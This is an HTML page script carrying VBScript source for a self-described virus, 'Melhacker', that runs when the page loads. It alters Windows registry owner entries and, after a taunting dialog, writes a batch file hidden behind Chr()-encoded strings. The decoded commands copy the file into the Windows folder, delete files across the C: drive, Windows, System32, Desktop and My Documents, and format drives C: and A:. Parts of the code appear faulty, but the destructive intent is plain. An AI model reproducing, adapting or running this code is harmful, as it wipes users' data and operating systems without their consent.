<Script Language = "VBScript">
<!--
' HTML.Melhacker/BAT.Melhacker/VBS.Melhack.D@mm
' [The Russian Man] - Vladimor Chamlkovic
' http://vx.netlux.org/~melhacker release on 27 October 2002
' This virus can be found at my official website. This web for personal used only and not for everyone.
' I will not responsible cause any damage that has been made by this virus. This virus also release on
' 11 November 2002, Monday, Russia
On Error Resume Next
If Day(Now) = 1 Or Day(Now) = 4 Or Day(Now) = 8 Or Day(Now) = 12 Or Day(Now) = 16 Or Day(Now) = 20 Or Day(Now) = 24 Or Day(Now) = 28 Then
Set WshShell = CreateObject("WScript.Shell")
'WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","Melhacker", "C:\Windows\Melhacker.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Vladimor Chamlkovic"
'WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "Melhacker Operating System"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Melhacker, Inc."
Set FSO = CreateObject("Scripting.FileSystemObject")
Dim MelDay
MelDay = Day(Now)
If MsgBox("To day is " & MelDay & ". I would like to kill your PC today. Do you agree or not?", vbYesNo + 0, "Melhacker Virii") = vbNo Then
  Set Melhacker = FSO.CreateTextFile("c:\Windows\sysmel32.exe.bat", 2, False)
  Melhacker.WriteLine "" & Chr(101) & Chr(99) & Chr(104) & Chr(111) & " " & Chr(111) & Chr(102) & Chr(102) & ""
  Melhacker.WriteLine "" & Chr(99) & Chr(108) & Chr(115) & ""
  Melhacker.WriteLine "" & Chr(58) & Chr(58) & " " & Chr(66) & Chr(65) & Chr(84) & Chr(46) & Chr(77) & Chr(101) & Chr(108) & Chr(104) & Chr(97) & Chr(99) & Chr(107) & Chr(101) & Chr(114) & ""
  Melhacker.WriteLine "" & Chr(73) & Chr(102) & " " & Chr(69) & Chr(120) & Chr(105) & Chr(115) & Chr(116) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(115) & Chr(121) & Chr(115) & Chr(109) & Chr(101) & Chr(108) & Chr(51) & Chr(50) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(46) & Chr(98) & Chr(97) & Chr(116) & " " & Chr(103) & Chr(111) & Chr(116) & Chr(111) & " " & Chr(75) & Chr(73) & Chr(76) & Chr(76) & ""
  Melhacker.WriteLine "" & Chr(103) & Chr(111) & Chr(116) & Chr(111) & " " & Chr(71) & Chr(69) & Chr(84) & ""
  Melhacker.WriteLine "" & Chr(58) & Chr(71) & Chr(69) & Chr(84) & ""
  Melhacker.WriteLine "" & Chr(99) & Chr(111) & Chr(112) & Chr(121) & " " & Chr(37) & Chr(48) & " " & Chr(37) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(105) & Chr(114) & Chr(37) & Chr(92) & Chr(115) & Chr(121) & Chr(115) & Chr(109) & Chr(101) & Chr(108) & Chr(51) & Chr(50) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(46) & Chr(98) & Chr(97) & Chr(116) & " " & Chr(62) & Chr(62) & Chr(78) & Chr(85) & Chr(76) & ""
  Melhacker.WriteLine "" & Chr(103) & Chr(111) & Chr(116) & Chr(111) & " " & Chr(67) & Chr(78) & ""
  Melhacker.WriteLine "" & Chr(58) & Chr(75) & Chr(73) & Chr(76) & Chr(76) & ""
  Melhacker.WriteLine "" & Chr(99) & Chr(108) & Chr(115) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(77) & Chr(121) & Chr(100) & Chr(111) & Chr(99) & Chr(117) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & "System32" & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & "Cursor" & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & "Desktop" & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & "Start Menu" & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(100) & Chr(101) & Chr(108) & " " & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(92) & "Start Menu" & Chr(92) & "Programs" & Chr(92) & Chr(42) & Chr(46) & Chr(42) & ""
  Melhacker.WriteLine "" & Chr(103) & Chr(111) & Chr(116) & Chr(111) & " " & Chr(67) & Chr(78) & ""
  Melhacker.WriteLine "" & Chr(58) & Chr(67) & Chr(78) & ""
  Melhacker.WriteLine "" & Chr(70) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(116) & " " & Chr(67) & Chr(58) & " " & Chr(92) & Chr(117) & " " & Chr(92) & Chr(113) & " " & Chr(92) & Chr(97) & Chr(117) & Chr(116) & Chr(111) & Chr(116) & Chr(101) & Chr(115) & Chr(116) & ""
  Melhacker.WriteLine "" & Chr(70) & Chr(111) & Chr(114) & Chr(109) & Chr(97) & Chr(116) & " " & Chr(65) & Chr(58) & " " & Chr(92) & Chr(117) & " " & Chr(92) & Chr(113) & " " & Chr(92) & Chr(97) & Chr(117) & Chr(116) & Chr(111) & Chr(116) & Chr(101) & Chr(115) & Chr(116) & ""
  Melhacker.WriteLine "" & Chr(103) & Chr(111) & Chr(116) & Chr(111) & " " & Chr(69) & Chr(78) & Chr(68) & ""
  Melhacker.WriteLine "" & Chr(58) & Chr(69) & Chr(78) & Chr(68) & ""
  Melhacker.WriteLine "" & Chr(58) & Chr(58) & " " & Chr(83) & Chr(112) & Chr(101) & Chr(99) & Chr(105) & Chr(97) & Chr(108) & " " & Chr(66) & Chr(121) & " " & Chr(86) & Chr(108) & Chr(97) & Chr(100) & Chr(105) & Chr(109) & Chr(111) & Chr(114) & " " & Chr(67) & Chr(104) & Chr(97) & Chr(109) & Chr(108) & Chr(107) & Chr(111) & Chr(118) & Chr(105) & Chr(99) & ""
  Melhacker.Close
  Melhacker.Run
Else
  End If
Else
    If MsgBox("Welcome to Melhacker, Inc. This website contain JAVASCRIPT and VBSCRIPT on HTML body. I will not responsible cause any damage " _
        & "when you visit this website. I recommended that you leave immediately from this website because it's just for personal use only. " _
        & "ONCE AGAIN I REPEAT PLEASE LEAVE THIS WEBSITE IMMEDIATLY IF YOU ARE NOT TRUST AT ME. Are sure to leave from this " _
        & "web site?", vbYesNo + vbCritical, "Melhacker, Inc.") = vbYes Then  
    Else
        MsgBox "Now you choose NO. Any damage, that's your fault!", vbInformation + 0, "Melhacker, Inc."
    End If
End If
-->
</SCRIPT>
